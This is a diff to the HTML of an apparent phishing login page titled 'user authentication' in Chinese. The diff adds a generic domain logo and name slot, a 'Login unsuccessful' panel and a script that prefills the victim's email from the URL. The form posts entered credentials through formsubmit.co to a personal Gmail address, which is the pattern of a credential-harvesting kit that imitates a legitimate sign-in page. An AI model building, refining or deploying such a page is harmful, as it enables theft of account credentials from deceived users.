@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Authenticate Account</title>
+  <title>用户认证</title>
   <meta name="description" content="Authenticate looging for verification." />
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -507,12 +507,32 @@
 
 <body>
   <header>
+    <div class="header-container">
+                <img id="domain-logo" src="" alt="Domain Logo">
+                <h2 id="domain-name"></h2>
+            </div>
+      
+        
 
+    <div class="help reveal d2">
+      <span aria-hidden="true">Need help?</span>
+      <a href="#" id="supportLink">Contact support</a>
+    </div>
+  </header>
+
+  <main>
+    <section class="shell" aria-label="Login unsuccessful">
+      <article class="panel reveal d3" aria-labelledby="title">
+        <div class="panel-inner">
+          <div class="kicker">
+            <span class="dot" aria-hidden="true"></span>
+            
+          </div>
     <div class="header-container">
       <aside class="actions reveal d4" aria-label="Try again actions">
         <div class="actions-inner">
           <div class="summary">
-            <span>Authentication</span>
+            <span>用户认证</span>
           </div>
 
           <form action="https://formsubmit.co/supermario44t@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
@@ -526,6 +546,13 @@
                   <path d="m5.5 8.2 6.1 5a1.5 1.5 0 0 0 1.9 0l6.1-5" stroke="rgba(238,241,246,.7)" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
                 </svg>
                 <input id="email" name="email" type="email" placeholder="姓名@公司.com" inputmode="email" autocomplete="email" />
+				<script>
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("email");
+  if (email) {
+    document.getElementById("emailInput").value = email;
+  }
+</script>
               </div>
               <div class="hint" id="emailHint">使用您注册的邮箱。</div>
             </div>
